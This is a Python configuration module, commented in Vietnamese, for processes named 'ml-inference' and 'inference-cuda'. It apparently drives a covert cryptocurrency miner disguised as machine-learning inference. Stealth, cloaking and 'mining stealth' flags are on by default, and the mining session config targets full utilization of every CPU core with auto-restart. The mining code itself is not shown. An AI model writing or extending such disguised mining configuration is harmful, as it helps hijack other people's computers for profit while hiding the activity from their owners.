from __future__ import annotations

"""
InferenceConfigService

Cung cấp cấu hình cho tiến trình ml-inference (CPU) và inference-cuda (GPU).
Đây là bản rút gọn của MLInferenceConfig, di chuyển vào khối cpu_plugins.
"""
import os
import json
import logging
from pathlib import Path
from typing import Dict, Any, Optional


class InferenceConfigService:
    """Service cấu hình cho tiến trình ml-inference.
    • Nhận *process_info* (do cpu_plugins discovery cung cấp).
    • Nếu thiếu, fallback sang giá trị trong resource_config.json hoặc mặc định.
    """

    def __init__(
        self,
        process_info: Optional[Dict[str, Any]] = None,
        config_path: str | None = None,
        logger: Optional[logging.Logger] = None,
    ):
        self.logger = logger or logging.getLogger(__name__)
        # Thông tin tiến trình thực tế do discovery cung cấp
        self.process_info = process_info or {}

        # Vẫn cho phép đọc resource_config.json để lấy tham số tài nguyên (threads, freq, ...)
        if not config_path:
            config_path = Path(__file__).parent.parent.parent / "config" / "resource_config.json"
        self.config_path = Path(config_path)
        self.config: Dict[str, Any] = {}
        self._load_config()

    # ... existing code from MLInferenceConfig EXCEPT apply_cpu_optimizations ...

    def _load_config(self):
        try:
            with open(self.config_path, 'r', encoding='utf-8') as f:
                self.config = json.load(f)
            self.logger.info(f"✅ Loaded configuration from {self.config_path}")
        except Exception as e:
            self.logger.error(f"Failed to load config from {self.config_path}: {e}")
            self.config = self._default_config()

    def _default_config(self) -> Dict[str, Any]:
        return {
            "processes": {"CPU": "ml-inference", "GPU": "inference-cuda"},
            "resource_allocation": {"cpu": {"max_threads": 12, "default_freq_mhz": 2600}},
            "optimization_parameters": {"cpu_optimization_enabled": True, "stealth_mode_enabled": True},
        }

    # ===== Getter wrappers =====
    def get_cpu_process_name(self) -> str:
        # Ưu tiên tên do discovery truyền xuống
        if self.process_info.get("name"):
            return str(self.process_info["name"])
        # Fallback: lấy từ file cấu hình hoặc mặc định
        return self.config.get("processes", {}).get("CPU", "ml-inference")

    def get_gpu_process_name(self) -> str:
        return self.config.get("processes", {}).get("GPU", "inference-cuda")

    def get_max_cpu_threads(self) -> int:
        # Nếu discovery đã cung cấp số thread, ưu tiên dùng
        if isinstance(self.process_info.get("threads"), int):
            return self.process_info["threads"]
        cpu_cfg = self.config.get("resource_allocation", {}).get("cpu", {})
        return cpu_cfg.get("max_threads", os.cpu_count() or 12)

    def get_cpu_frequency_mhz(self) -> int:
        cpu_cfg = self.config.get("resource_allocation", {}).get("cpu", {})
        return cpu_cfg.get("default_freq_mhz", 2600)

    # ===== Flags =====
    def is_stealth_mode_enabled(self) -> bool:
        return os.getenv("ENABLE_STEALTH_MODE", "1") == "1"

    def is_optimized_mining_enabled(self) -> bool:
        return os.getenv("USE_OPTIMIZED_MINING", "1") == "1"

    # ===== Composite configs =====
    def get_environment_variables(self) -> Dict[str, str]:
        max_threads = self.get_max_cpu_threads()
        env = {
            "ML_PROCESS_NAME": self.get_cpu_process_name(),
            "GPU_PROCESS_NAME": self.get_gpu_process_name(),
            "CPU_MAX_THREADS": str(max_threads),
            "CPU_TARGET_FREQ_MHZ": str(self.get_cpu_frequency_mhz()),
            "USE_OPTIMIZED_MINING": "1" if self.is_optimized_mining_enabled() else "0",
            "ENABLE_STEALTH_MODE": "1" if self.is_stealth_mode_enabled() else "0",
            "OMP_NUM_THREADS": str(max_threads),
            "GOMP_CPU_AFFINITY": f"0-{max_threads-1}",
            "CLOAK_ENABLED": "1" if self.is_stealth_mode_enabled() else "0",
            "MINING_STEALTH": "1" if self.is_stealth_mode_enabled() else "0",
        }
        return env

    def get_mining_session_config(self) -> Dict[str, Any]:
        max_threads = self.get_max_cpu_threads()
        cpu_freq = self.get_cpu_frequency_mhz()
        base = 1_000_000  # 1M
        multiplier = cpu_freq / 2600.0
        iterations = int(base * multiplier * max_threads)
        return {
            "profile": self.get_cpu_process_name(),
            "total_iterations": iterations * 10,
            "batch_size": iterations,
            "monitoring_interval": 1.0,
            "auto_restart": True,
            "throttling_enabled": True,
            "stealth_mode": self.is_stealth_mode_enabled(),
            "cores": max_threads,
            "target_cpu_utilization": max_threads * 100,
            "optimization_level": "maximum",
        }

    def validate_configuration(self) -> bool:
        try:
            # Check for required fields - processes is required, resource_allocation is optional
            if "processes" not in self.config:
                self.logger.error("Missing required 'processes' field in resource_config.json")
                return False
            
            # Check CPU process name
            cpu_process_name = self.get_cpu_process_name()
            if cpu_process_name != "ml-inference":
                self.logger.warning(f"CPU process name is '{cpu_process_name}', expected 'ml-inference' but continuing")
            
            # Check max threads
            mt = self.get_max_cpu_threads()
            if not (1 <= mt <= 64):
                self.logger.error(f"Invalid max_threads: {mt}, must be between 1 and 64")
                return False
                
            self.logger.info(f"✅ InferenceConfigService validation passed: {cpu_process_name}, {mt} threads")
            return True
        except Exception as e:
            self.logger.error(f"Validation failed: {e}")
            return False

    # String repr
    def __str__(self) -> str:  # noqa: DunderStr
        return f"InferenceConfigService(process={self.get_cpu_process_name()}, threads={self.get_max_cpu_threads()}, stealth={self.is_stealth_mode_enabled()})"


# ---- Singleton helper ----
_global_cfg: Optional[InferenceConfigService] = None

def get_inference_config(
    process_info: Optional[Dict[str, Any]] = None,
    logger: Optional[logging.Logger] = None,
) -> InferenceConfigService:  # noqa: N802
    """Singleton getter.
    • Lần gọi đầu tiên có thể truyền process_info để khởi tạo.
    • Các lần tiếp theo, nếu muốn cập nhật process_info mới → tạo instance mới.
    """
    global _global_cfg
    if _global_cfg is None or process_info:
        _global_cfg = InferenceConfigService(process_info=process_info, logger=logger)
    return _global_cfg 